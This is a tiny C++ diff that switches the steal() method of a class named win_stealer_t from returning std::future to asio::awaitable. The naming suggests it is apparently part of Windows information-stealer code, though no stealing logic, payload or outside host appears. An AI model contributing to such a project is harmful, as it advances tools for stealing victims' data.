@@ -22,7 +22,7 @@ struct pc_t
 class win_stealer_t : public base_stealer_t
 {
 public:
-    std::future<std::string> steal() override;
+    asio::awaitable<std::string> steal() override;
 };
 
 
